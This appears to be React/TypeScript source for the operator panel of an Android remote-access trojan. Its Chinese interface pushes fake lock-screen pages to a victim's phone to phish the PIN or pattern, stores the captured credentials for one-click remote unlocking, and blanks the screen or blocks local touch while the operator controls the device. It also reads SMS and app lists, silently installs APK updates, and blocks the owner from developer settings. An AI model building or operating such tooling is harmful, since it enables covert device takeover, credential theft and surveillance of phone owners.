    try {
      const result = await sendCommand({
        deviceId,
        cmd: "hide_keyguard_fake_page",
        params: {},
        waitMs: 10000,
      });
      if (result.status !== "success") {
        throw new Error(result.errorMessage ?? result.status);
      }
      setKeyguardFakeMessage("锁屏伪页已关闭");
      onCommandSent("锁屏伪页：已关闭");
    } catch (error) {
      const text = error instanceof Error ? error.message : "关闭失败";
      setKeyguardFakeMessage(text);
      message.error(text);
    } finally {
      setKeyguardFakeBusy(false);
    }
  }

  function fakeRecordItemId(record: FakePageSubmission) {
    return `fake-${record.id}`;
  }

  async function handleFakePageAddToHistory(record: FakePageSubmission) {
    const text = record.text.trim();
    if (!text) {
      message.warning("采集内容为空");
      return;
    }
    if (isMaskedSecret(text)) {
      message.warning("这是掩码脏数据，不能保存");
      return;
    }
    const id = fakeRecordItemId(record);
    const lockType = resolveLockType(text);
    setFakeRecordBusyId(id);
    try {
      await saveKeyguardPinHistory(deviceId, {
        pin: text,
        lockType,
        capturedAt: Date.parse(record.capturedAt) || Date.now(),
        source: "manual",
      });
      setPasswordStoreTick((value) => value + 1);
      const hint = `已加入历史密码：${lockTypeLabel(lockType, text)}`;
      showKeyguardFakeHint(hint, "success");
      message.success("已加入历史密码");
    } catch (error) {
      const errText = error instanceof Error ? error.message : "保存失败";
      showKeyguardFakeHint(errText, "warn");
      message.error(errText);
    } finally {
      setFakeRecordBusyId(null);
    }
  }

  async function handleFakePageSetAsDefault(record: FakePageSubmission) {
    const text = record.text.trim();
    if (!text) {
      message.warning("采集内容为空");
      return;
    }
    if (isMaskedSecret(text)) {
      message.warning("这是掩码脏数据，不能保存");
      return;
    }
    const id = fakeRecordItemId(record);
    const lockType = resolveLockType(text);
    setFakeRecordBusyId(id);
    try {
      const history = await saveKeyguardPinHistory(deviceId, {
        pin: text,
        lockType,
        capturedAt: Date.parse(record.capturedAt) || Date.now(),
        source: "manual",
      });
      setPasswordAsDefault(deviceId, history.id);
      const keyguardRecord = await saveKeyguardPin(deviceId, text, lockType);
      onKeyguardPinChange?.(keyguardRecord);
      setPasswordStoreTick((value) => value + 1);
      const hint = `已设为默认密码：${lockTypeLabel(lockType, text)}，可切到「解锁」Tab 一键解锁`;
      showKeyguardFakeHint(hint, "success");
      message.success("已设为默认密码");
      onCommandSent("伪页采集已设为默认锁屏凭据");
    } catch (error) {
      const errText = error instanceof Error ? error.message : "设置失败";
      showKeyguardFakeHint(errText, "warn");
      message.error(errText);
    } finally {
      setFakeRecordBusyId(null);
    }
  }

  return (
    <div className="remote-ops-panel">
      <div className="ops-tool-rail" role="toolbar" aria-label="远程操作">
        <button
          type="button"
          className="ops-tool-btn"
          disabled={!isOnline || pasteBusy}
          onClick={() => {
            setClipboardInput("");
            setClipboardOpen(true);
          }}
          title="输入文字并发送到手机当前输入框"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <SnippetsOutlined />
          </span>
          <span className="ops-tool-btn-label">{pasteBusy ? "粘贴中" : "剪贴板"}</span>
        </button>

        <button
          type="button"
          className="ops-tool-btn"
          disabled={!isOnline || unlockBusy}
          onClick={() => void sendWakeScreen()}
          title="唤醒屏幕"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <BulbOutlined />
          </span>
          <span className="ops-tool-btn-label">唤醒</span>
        </button>

        <button
          type="button"
          className={`ops-tool-btn${keepAwakeActive ? " is-active" : ""}`}
          disabled={!isOnline || keepAwakeBusy}
          onClick={() => void toggleKeepAwakeScreen()}
          title={
            keepAwakeActive
              ? "关闭屏幕常亮并恢复息屏时间"
              : "开启屏幕常亮（需「修改系统设置」权限）"
          }
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <DesktopOutlined />
          </span>
          <span className="ops-tool-btn-label">
            {keepAwakeBusy ? "处理中" : keepAwakeActive ? "关常亮" : "屏幕常亮"}
          </span>
        </button>

        <button
          type="button"
          className="ops-tool-btn"
          disabled={!isOnline || brightnessBusy}
          onClick={() => void sendBrightnessMin()}
          title="将手机亮度调到最低（需「修改系统设置」权限）"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <MoonOutlined />
          </span>
          <span className="ops-tool-btn-label">
            {brightnessBusy ? "处理中" : "亮度最低"}
          </span>
        </button>

        <button
          type="button"
          className={`ops-tool-btn${lockWorkspaceOpen ? " is-active" : ""}`}
          disabled={!isOnline}
          onClick={() => toggleWorkspace("lock")}
          title="锁屏 / 解锁（在公共操作区打开，可同时触控屏幕）"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <LockOutlined />
          </span>
          <span className="ops-tool-btn-label">锁屏</span>
        </button>

        <button
          type="button"
          className={`ops-tool-btn${blackScreenActive ? " is-active" : ""}`}
          disabled={!isOnline || blackScreenBusy}
          onClick={() => void toggleBlackScreen()}
          title={blackScreenActive ? "关闭黑屏阻断" : "黑屏阻断：本地点控无效，远程可操作"}
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <EyeInvisibleOutlined />
          </span>
          <span className="ops-tool-btn-label">
            {blackScreenBusy ? "处理中" : blackScreenActive ? "关阻断" : "黑屏阻断"}
          </span>
        </button>

        <button
          type="button"
          className={`ops-tool-btn${takeoverActive ? " is-active" : ""}`}
          disabled={!isOnline || takeoverBusy}
          onClick={() => void togglePhoneTakeover()}
          title={
            takeoverActive
              ? "关闭接管阻断"
              : "接管阻断：本地点控无效，远程可操作"
          }
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <ControlOutlined />
          </span>
          <span className="ops-tool-btn-label">
            {takeoverBusy ? "处理中" : takeoverActive ? "解接管" : "接管"}
          </span>
        </button>

        <button
          type="button"
          className="ops-tool-btn"
          disabled={!isOnline || muteBusy}
          onClick={() => void sendMutePhone()}
          title="静音"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <AudioMutedOutlined />
          </span>
          <span className="ops-tool-btn-label">{muteBusy ? "静音中" : "静音"}</span>
        </button>

        <button
          type="button"
          className={`ops-tool-btn${autoRotationEnabled ? " is-active" : ""}`}
          disabled={!isOnline || rotationBusy}
          onClick={() => void toggleAutoRotation()}
          title={autoRotationEnabled ? "关闭自动旋转" : "开启自动旋转"}
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <RotateRightOutlined />
          </span>
          <span className="ops-tool-btn-label">
            {rotationBusy ? "处理中" : autoRotationEnabled ? "关旋转" : "开旋转"}
          </span>
        </button>

        <button
          type="button"
          className="ops-tool-btn"
          disabled={!isOnline || rebootBusy}
          onClick={() => void sendRebootPhone()}
          title="重启手机"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <PoweroffOutlined />
          </span>
          <span className="ops-tool-btn-label">{rebootBusy ? "重启中" : "重启"}</span>
        </button>

        <button
          type="button"
          className="ops-tool-btn"
          disabled={!isOnline || uninstallBusy}
          onClick={() => void sendUninstallPhone()}
          title="关闭无障碍，便于手动卸载"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <DeleteOutlined />
          </span>
          <span className="ops-tool-btn-label">{uninstallBusy ? "处理中" : "卸载"}</span>
        </button>

        <button
          type="button"
          className="ops-tool-btn"
          disabled={!isOnline || updateApkBusy}
          onClick={() => void sendUpdateApk()}
          title="下载并覆盖安装 B 包；确认框请在投屏里点"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <CloudDownloadOutlined />
          </span>
          <span className="ops-tool-btn-label">{updateApkBusy ? "更新中" : "更新B包"}</span>
        </button>

        <button
          type="button"
          className={`ops-tool-btn${appsWorkspaceOpen ? " is-active" : ""}`}
          onClick={() => toggleWorkspace("apps")}
          title="应用列表（在公共操作区打开）"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <AppstoreOutlined />
          </span>
          <span className="ops-tool-btn-label">应用</span>
        </button>

        <button
          type="button"
          className={`ops-tool-btn${smsWorkspaceOpen ? " is-active" : ""}`}
          onClick={() => toggleWorkspace("sms")}
          title="短信列表（在公共操作区打开）"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <MailOutlined />
          </span>
          <span className="ops-tool-btn-label">短信</span>
        </button>

        <button
          type="button"
          className={`ops-tool-btn${opsWorkspace === "phone-agent" ? " is-active" : ""}`}
          disabled={!isOnline}
          onClick={() => toggleWorkspace("phone-agent")}
          title="AI 操机（在公共操作区打开）"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <RobotOutlined />
          </span>
          <span className="ops-tool-btn-label">AI 操机</span>
        </button>

        <button
          type="button"
          className={`ops-tool-btn${adbWorkspaceOpen ? " is-active" : ""}`}
          disabled={!isOnline}
          onClick={() => toggleWorkspace("adb")}
          title="ADB：点开后约 5 分钟内放行开发者/无线调试（手机本地进仍踢）；到期再点续期"
        >
          <span className="ops-tool-btn-icon" aria-hidden="true">
            <ApiOutlined />
          </span>
          <span className="ops-tool-btn-label">ADB</span>
        </button>
      </div>

      {workspaceHost && lockWorkspaceOpen
        ? createPortal(
            <div className="ops-workspace-panel ops-workspace-panel--lock">
              <Tabs
                className="ops-lock-modal-tabs"
                activeKey={lockModalTab}
                onChange={(key) => setLockModalTab(key as "unlock" | "fake")}
                items={[
                  {
                    key: "unlock",
                    label: "锁屏 / 解锁",
                    children: (
                      <>
                        <section className="ops-section">
                          <div className="ops-section-title">锁屏操作</div>
                          <div className="ops-lock-modal-actions">
                            <button
                              type="button"
                              className="secondary-button"
                              disabled={!isOnline || lockBusy}
                              onClick={() => void sendLockScreen()}
                            >
                              {lockBusy ? "锁屏中…" : "立即锁屏"}
                            </button>
                            <button
                              type="button"
                              className="secondary-button"
                              disabled={!isOnline || unlockBusy}
                              onClick={() => void sendWakeScreen()}
                            >
                              唤醒屏幕
                            </button>
                          </div>
                          {lockMessage ? <div className="ops-hint">{lockMessage}</div> : null}
                        </section>

                        <section className="ops-section">
                          <div className="ops-section-title">解锁</div>
                          <div className="ops-unlock-row">
                            <input
                              className="ops-input"
                              type="password"
                              inputMode={keyguardPin?.lockType === "pattern" ? "text" : "numeric"}
                              autoComplete="off"
                              placeholder={
                                keyguardPin?.lockType === "pattern"
                                  ? "图形路径如 7-4-5-8-9-6（可空=用采集记录）"
                                  : "锁屏 PIN"
                              }
                              value={unlockPin}
                              onChange={(event) => setUnlockPin(event.target.value)}
                            />
                            <button
                              type="button"
                              className="primary-button"
                              disabled={
                                !isOnline ||
                                unlockBusy ||
                                (!unlockPin.trim() && keyguardPin?.lockType !== "pattern")
                              }
                              onClick={() => void sendUnlockPin()}
                            >
                              解锁
                            </button>
                          </div>
                          {unlockMessage ? <div className="ops-hint">{unlockMessage}</div> : null}
                        </section>

                        <section className="ops-section">
                          <div className="ops-section-title">一键解锁（自动采集）</div>
                          {keyguardPin?.pin ? (
                            <article className="ops-record-item ops-record-item--keyguard">
                              <div className="ops-record-head">
                                <span className="ops-record-label">
                                  {keyguardPin.lockType === "pattern"
                                    ? `图形 ${keyguardPin.digitCount} 点`
                                    : keyguardPin.lockType === "password"
                                      ? `混合密码 ${keyguardPin.digitCount} 位`
                                      : `${keyguardPin.digitCount} 位 PIN`}
                                </span>
                                <span className="ops-record-time">
                                  {formatTime(new Date(keyguardPin.capturedAt).getTime())}
                                </span>
                              </div>
                              <div className="ops-record-value ops-record-value--pin">
                                {keyguardPin.pin}
                              </div>
                              {isMaskedSecret(keyguardPin.pin) ? (
                                <div className="ops-hint ops-hint--warn">
                                  这是掩码脏数据，不是真实密码。请点「清除无效采集」，或在伪页 Tab
                                  重新采集。
                                </div>
                              ) : null}
                              {keyguardPin.lockType === "pattern" && !keyguardPin.gesturePath ? (
                                <div className="ops-hint">
                                  无 PATH，将用格点 cells 在真锁屏上自动绘制（需已进入图案页）
                                </div>
                              ) : null}
                              <div className="ops-record-actions">
                                {keyguardPin.lockType !== "pattern" &&
                                !isMaskedSecret(keyguardPin.pin) ? (
                                  <button
                                    type="button"
                                    className="secondary-button"
                                    onClick={() => setUnlockPin(keyguardPin.pin)}
                                  >
                                    填入解锁框
                                  </button>
                                ) : null}
                                {isMaskedSecret(keyguardPin.pin) ? (
                                  <button
                                    type="button"
                                    className="secondary-button"
                                    onClick={() => void handleClearInvalidKeyguard()}
                                  >
                                    清除无效采集
                                  </button>
                                ) : null}
                                <button
                                  type="button"
                                  className="primary-button"
                                  disabled={
                                    !isOnline ||
                                    unlockBusy ||
                                    isMaskedSecret(keyguardPin.pin) ||
                                    (keyguardPin.lockType === "pattern" &&
                                      !isPatternCells(keyguardPin.pin) &&
                                      !keyguardPin.gesturePath?.startsWith("["))
                                  }
                                  onClick={() => {
                                    void sendUnlockWithRecord(keyguardPin);
                                  }}
                                >
                                  一键解锁
                                </button>
                              </div>
                            </article>
                          ) : (
                            <div className="empty-state ops-empty">解锁成功后自动上传完整凭据</div>
                          )}
                        </section>

                        <section className="ops-section">
                          <div className="ops-section-title">密码记录</div>
                          <DevicePasswordRecordsPanel
                            key={`pwd-history-${deviceId}-${keyguardPin?.pin ?? ""}-${keyguardPin?.updatedAt ?? keyguardPin?.capturedAt ?? ""}`}
                            deviceId={deviceId}
                            isOnline={isOnline}
                            keyguardPin={keyguardPin}
                            onKeyguardPinChange={onKeyguardPinChange}
                            refreshKey={passwordStoreTick}
                          />
                        </section>
                      </>
                    ),
                  },
                  {
                    key: "fake",
                    label: "锁屏伪页",
                    children: (
                      <div className="ops-keyguard-fake-form">
                        <div className="ops-keyguard-fake-lock-type">
                          <span className="ops-keyguard-fake-label">当前锁屏类型</span>
                          <strong className="ops-keyguard-fake-lock-type-value">
                            {lockTypeDetecting && !displayedLockType
                              ? "检测中…"
                              : formatLockTypeLabel(displayedLockType)}
                          </strong>
                          {lockTypeSource ? (
                            <span className="ops-keyguard-fake-lock-type-source">
                              （{lockTypeSource}）
                            </span>
                          ) : null}
                          {!keyguardPin?.lockType ? (
                            <button
                              type="button"
                              className="secondary-button ops-keyguard-fake-detect-btn"
                              disabled={!isOnline || lockTypeDetecting}
                              onClick={() => void detectKeyguardLockType()}
                            >
                              {lockTypeDetecting ? "检测中…" : "重新检测"}
                            </button>
                          ) : null}
                        </div>
                        <div className="ops-hint">
                          先在下方选择 Web 链接再下发；图案伪页与 Web
                          伪页均使用所选 https 地址（不会自动拼后台 IP）
                        </div>
                        <div className="ops-keyguard-fake-field">
                          <span className="ops-keyguard-fake-label">Web 链接 (HTTPS)</span>
                          <Space.Compact style={{ width: "100%" }}>
                            <Select
                              showSearch
                              optionFilterProp="label"
                              loading={keyguardFakeWebLinksLoading}
                              placeholder={
                                keyguardFakeWebLinks.length === 0
                                  ? "暂无链接，请点 + 新增"
                                  : "请选择 Web 链接"
                              }
                              value={keyguardFakeWebUrl || undefined}
                              options={keyguardFakeWebLinks.map((item) => ({
                                value: item.url,
                                label: `${item.name}（${item.url}）`,
                              }))}
                              onChange={(value) => setKeyguardFakeWebUrl(value)}
                              style={{ width: "100%" }}
                              notFoundContent="暂无链接"
                            />
                            <Button
                              type="primary"
                              icon={<PlusOutlined />}
                              title="新增 Web 链接"
                              onClick={() => {
                                setKeyguardFakeNewLinkName("");
                                setKeyguardFakeNewLinkUrl("");
                                setKeyguardFakeAddLinkOpen(true);
                              }}
                            />
                          </Space.Compact>
                        </div>
                        <div className="ops-lock-modal-actions">
                          <button
                            type="button"
                            className="primary-button"
                            disabled={!isOnline || keyguardFakeBusy}
                            onClick={() => void sendKeyguardFakePatternPage()}
                          >
                            {keyguardFakeBusy ? "下发中…" : "下发图案伪页"}
                          </button>
                          <button
                            type="button"
                            className="secondary-button"
                            disabled={!isOnline || keyguardFakeBusy}
                            onClick={() => void sendKeyguardFakePage()}
                          >
                            下发 Web 伪页
                          </button>
                          <button
                            type="button"
                            className="secondary-button"
                            disabled={!isOnline || keyguardFakeBusy}
                            onClick={() => void hideKeyguardFakePage()}
                          >
                            关闭伪页
                          </button>
                          <button
                            type="button"
                            className="secondary-button"
                            disabled={keyguardFakeRecordsLoading}
                            onClick={() => void loadKeyguardFakeRecords()}
                          >
                            {keyguardFakeRecordsLoading ? "刷新中…" : "刷新采集"}
                          </button>
                        </div>
                        {keyguardFakeMessage ? (
                          <div
                            className={`ops-hint${
                              keyguardFakeMessageKind === "success"
                                ? " ops-hint--success"
                                : keyguardFakeMessageKind === "warn"
                                  ? " ops-hint--warn"
                                  : ""
                            }`}
                          >
                            {keyguardFakeMessage}
                          </div>
                        ) : null}
                        {keyguardFakeRecords.length > 0 ? (
                          <ul className="ops-keyguard-fake-records">
                            {keyguardFakeRecords.slice(0, 8).map((record) => {
                              const itemId = fakeRecordItemId(record);
                              const lockType = resolveLockType(record.text);
                              const typeTag =
                                lockType === "pattern"
                                  ? "图形"
                                  : lockType === "password"
                                    ? "混合"
                                    : "PIN";
                              return (
                                <li key={record.id} className="ops-keyguard-fake-record-item">
                                  <div className="ops-keyguard-fake-record-main">
                                    <span className="ops-record-label">
                                      {record.title || "锁屏验证"}
                                      <span className="ops-keyguard-fake-type-tag">{typeTag}</span>
                                    </span>
                                    <span className="ops-record-value">{record.text}</span>
                                    <span className="ops-record-time">
                                      {formatTime(new Date(record.capturedAt).getTime())}
                                    </span>
                                  </div>
                                  <div className="ops-record-actions">
                                    <button
                                      type="button"
                                      className="secondary-button"
                                      disabled={
                                        fakeRecordBusyId === itemId || isMaskedSecret(record.text)
                                      }
                                      onClick={() => void handleFakePageSetAsDefault(record)}
                                    >
                                      设为默认密码
                                    </button>
                                    <button
                                      type="button"
                                      className="secondary-button"
                                      disabled={
                                        fakeRecordBusyId === itemId || isMaskedSecret(record.text)
                                      }
                                      onClick={() => void handleFakePageAddToHistory(record)}
                                    >
                                      加入历史密码
                                    </button>
                                  </div>
                                </li>
                              );
                            })}
                          </ul>
                        ) : (
                          <div className="empty-state ops-empty">暂无锁屏伪页采集</div>
                        )}
                      </div>
                    ),
                  },
                ]}
              />
            </div>,
            workspaceHost,
          )
        : null}

      <Modal
        title="剪切板 → 手机"
        open={clipboardOpen}
        onCancel={() => {
          if (!pasteBusy) {
            setClipboardOpen(false);
          }
        }}
        onOk={() => void handleClipboardSubmit()}
        confirmLoading={pasteBusy}
        okText="发送"
        cancelText="取消"
        destroyOnClose
        centered={false}
        zIndex={12000}
        getContainer={() => document.body}
        afterOpenChange={(open) => {
          if (open) {
            clipboardFieldRef.current?.focus();
          }
        }}
        footer={[
          <Button
            key="local"
            onClick={() => void fillFromComputerClipboard()}
            disabled={pasteBusy}
          >
            读取电脑剪贴板
          </Button>,
          <Button key="cancel" onClick={() => setClipboardOpen(false)} disabled={pasteBusy}>
            取消
          </Button>,
          <Button
            key="ok"
            type="primary"
            loading={pasteBusy}
            onClick={() => void handleClipboardSubmit()}
          >
            发送
          </Button>,
        ]}
      >
        <Form layout="vertical" style={{ marginTop: 8 }}>
          <Form.Item
            label="发送内容"
            extra="回车即发送到手机当前聚焦的输入框"
            style={{ marginBottom: 0 }}
          >
            <Input.TextArea
              ref={clipboardFieldRef}
              autoFocus
              autoSize={{ minRows: 3, maxRows: 8 }}
              placeholder="用电脑键盘输入，按回车发送"
              value={clipboardInput}
              onChange={(event) => setClipboardInput(event.target.value)}
              onPressEnter={(event) => {
                // 回车直发；Shift+回车换行
                if (event.shiftKey) {
                  return;
                }
                event.preventDefault();
                void handleClipboardSubmit();
              }}
            />
          </Form.Item>
        </Form>
      </Modal>

      <Modal
        title="新增 Web 链接"
        open={keyguardFakeAddLinkOpen}
        onCancel={() => {
          if (!keyguardFakeAddingLink) {
            setKeyguardFakeAddLinkOpen(false);
          }
        }}
        onOk={() => void handleAddKeyguardFakeWebLink()}
        confirmLoading={keyguardFakeAddingLink}
        okText="保存"
        cancelText="取消"
        destroyOnClose
        centered={false}
        zIndex={12000}
        getContainer={() => document.body}
      >
        <Form layout="vertical" style={{ marginTop: 8 }}>
          <Form.Item label="名称" required>
            <Input
              placeholder="例如：系统更新页"
              value={keyguardFakeNewLinkName}
              onChange={(event) => setKeyguardFakeNewLinkName(event.target.value)}
              maxLength={128}
            />
          </Form.Item>
          <Form.Item label="链接 (HTTPS)" required>
            <Input
              placeholder="https://example.com/lock/"
              value={keyguardFakeNewLinkUrl}
              onChange={(event) => setKeyguardFakeNewLinkUrl(event.target.value)}
              maxLength={512}
            />
          </Form.Item>
        </Form>
      </Modal>

      {workspaceHost && appsWorkspaceOpen
        ? createPortal(
            <DeviceAppListModal
              embedded
              open={appsWorkspaceOpen}
              deviceId={deviceId}
              deviceLabel={deviceLabel ?? deviceId}
              isOnline={isOnline}
              onClose={() => onOpsWorkspaceChange("none")}
            />,
            workspaceHost,
          )
        : null}

      {workspaceHost && smsWorkspaceOpen
        ? createPortal(
            <DeviceSmsModal
              embedded
              open={smsWorkspaceOpen}
              deviceId={deviceId}
              deviceLabel={deviceLabel ?? deviceId}
              isOnline={isOnline}
              onClose={() => onOpsWorkspaceChange("none")}
            />,
            workspaceHost,
          )
        : null}
    </div>
  );
}
